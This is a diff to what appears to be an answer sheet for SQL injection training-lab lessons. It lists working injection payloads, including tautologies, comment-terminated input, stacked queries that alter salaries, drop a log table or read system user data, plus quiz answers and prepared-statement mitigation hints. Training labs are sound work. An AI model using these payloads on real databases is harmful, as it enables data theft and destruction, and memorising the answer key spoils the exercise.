@@ -3,14 +3,16 @@
 ### 3 UPDATE employees SET department = 'Sales' WHERE last_name = 'Barnett'
 ### 4 ALTER TABLE employees ADD phone varchar(20)
 ### 5 GRANT ALL ON grant_rights TO unauthorized_user
-### 9 SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
-### 10 SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1
-### 11 ' OR 1 =1 --
+### 9 ['] [or] ['1'='1]
+SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
+### 10 [1] [1 or 1=1]
+SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1
+### 11 [] [' OR 1 =1 --]
 ### 12 '; UPDATE employees SET salary=100000 WHERE last_name = 'Smith' -- 
 ### 13 '; DROP TABLE access_log
 
 # SQL Injection (Advanced)
-### 3 SELECT * FROM user_data WHERE last_name = 'Smith'; SELECT * FROM user_system_data --'
+### 3 [';SELECT * FROM user_data WHERE last_name = 'Smith'; SELECT * FROM user_system_data --'] []
 ### 5 tom' AND '1'='1
     returns: User {0} already exists please try to register with a different username.
 
@@ -24,13 +26,12 @@
     2.3
     3.2
     4.3
-    5.3
-    6.4
+    5.4
 
 # SQL Injection (Mitigation)
 ### 5
     getConnection
-        PreparedStatement statement
+    PreparedStatement statement
     prepareStatement
     ?
     ?
